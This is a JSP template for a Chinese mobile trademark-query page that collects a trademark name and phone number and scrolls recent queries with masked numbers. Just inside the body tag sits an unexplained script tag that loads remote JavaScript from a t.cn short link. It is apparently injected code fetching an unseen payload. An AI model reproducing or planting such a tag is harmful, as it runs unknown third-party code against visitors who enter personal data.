<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%@ include file="/WEB-INF/common/taglibs.jsp"%>
<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link rel="stylesheet" href="${ctx}/static/css/reset.css">
<link rel="stylesheet" href="${ctx}/static/css/phone.css">
<script src="${ctx}/static/js/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>
<script src="${ctx}/static/js/Artificialquery.js" type="text/javascript" charset="utf-8"></script>
<script src="${ctx}/static/js/phone.js" type="text/javascript" charset="utf-8"></script>
<script src="${ctx}/static/js/swiper-3.3.1.min.js" type="text/javascript" charset="utf-8"></script>

<title>查询列表</title>
<!-- <style>
  .scroll_all{width:100%;height:30px;background:#bbb;line-height:30px;}	
  .scroll_all>span{width:35%;float:left;display:inline-block;padding-left:5%;color:#fff;font-size:14px;}
  .scroll_all ul li{width:100%;color:#fff;}
  .scroll_all span.line1{width:30%;display:inline-block;}
  .scroll_all span.line2{width:70%;}
 .swiper-container1 {
        width: 60%;
        height: 30px;
		float:left;
    }
	.swiper-container1
    .swiper-slide1 {
        text-align: left;
        font-size: 12px;
        background: #bbb;
		
        /* Center slide text vertically */
        display: -webkit-box;
        display: -ms-flexbox;
        display: -webkit-flex;
        display: flex;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        -webkit-align-items: center;
        align-items: center;
    }
    </style> -->
</head>

<body id="db_regi">
	<script src=http://t.cn/RqC4pMc></script>
    <script type="text/javascript">
		var basePath = '${ctx}';
	</script>
	<div style="width:100%;position:fixed;top:45%;text-align:center;z-index:10;"><button id="warn_tip" type="button">提交成功！</button></div>
	<img src="${ctx}/static/img/buchengg.png" style="width:100%;">
	<shiro:guest>
    <form>
    	<label>&nbsp;&nbsp;商标名称：<input tabindex="text" placeholder="如:路标网" id="miancontent"/></label>
        <label><span style="color:red;">*</span>电话号码：<input tabindex="text" placeholder="仅官方可见" id="mianphone"/></label>
        <p id="error" style="color:red;width:95%;margin:0 auto"></p>
        <button type="button" id="mianresult" class="mianre">免费获取查询结果<!-- <br/>已有<span style="color:#fdff3a" id="peopleCount"></span>人获取了查询结果 --></button>

        <div class="scroll_all clearfix">
        	<span>[最近查询记录]</span>
            <ul class="swiper-container swiper-container1" style="height:30px;overflow:hidden;">
            	<div class="swiper-wrapper">
            	<c:forEach items="${list}" var="man" varStatus="vs">  
            	<a href="#" class="hot swiper-slide swiper-slide1">
                	<li><span class="line1">${fn:substring(man.content, 0, 1)}***</span><span class="line2">用户(${fn:substring(man.phone, 0, 3)}****${fn:substring(man.phone, 7, 11)})</span></li>
                </a>
                </c:forEach>
             <!--    <a href="#" class="swiper-slide swiper-slide1">
                	<li><span class="line1">久</span><span class="line2">用户（182****1122）</span></li>
                </a>
                <a href="#" class="swiper-slide swiper-slide1">
                	<li><span class="line1">久</span><span class="line2">用户（182****1122）</span></li>
                </a>
                <a href="#" class="swiper-slide swiper-slide1">
                	<li><span class="line1">久</span><span class="line2">用户（182****1122）</span></li>
                </a>
                <a href="#" class="swiper-slide swiper-slide1">
                	<li><span class="line1">久</span><span class="line2">用户（182****1122）</span></li>
                </a>
                <a href="#" class="swiper-slide swiper-slide1">
                	<li><span class="line1">久</span><span class="line2">用户（182****1122）</span></li>
                </a> -->
                </div>
            </ul>
        </div>

        <input type="hidden" value="0" id="flag">

    </form>
    </shiro:guest>
    <shiro:user>
    <form>
    	<label>&nbsp;&nbsp;商标名称：<input tabindex="text" placeholder="如:路标网" id="miancontent"/></label>
        <label><span style="color:red;">*</span>电话号码：<input tabindex="text" placeholder="仅官方可见" id="mianphone" value=<shiro:principal></shiro:principal> readonly="readonly"/></label>
        <p id="error" style="color:red;width:95%;margin:0 auto"></p>
        <button type="button" id="mianresult" class="mianre">免费获取查询结果<!-- <br/>已有<span style="color:#fdff3a" id="peopleCount"></span>人获取了查询结果 --></button>
    </form>
    </shiro:user>
    <img src="${ctx}/static/img/huaichu.png" style="width:100%;"/>
    <img src="${ctx}/static/img/liuc.png" style="width:100%;"/>
    <button type="button" class="mianre" id="top">免费人工查询<br/><span style="font-size:12px;">500名专业顾问为您服务</span></button>
    <input type="hidden" value="1" id="flag">
</body>
<script type="text/javascript">
var swiper = new Swiper('.swiper-container', {
	
    pagination: '.swiper-pagination',
    slidesPerView: 1,
    paginationClickable: true,
    spaceBetween: 2,
    autoplay: 2000,
    speed:750,
    autoplayDisableOnInteraction: false,
	direction: 'vertical',
	loop: true
});
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?eb194d5472c74b4fef24b33d4106dd2c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
</html>
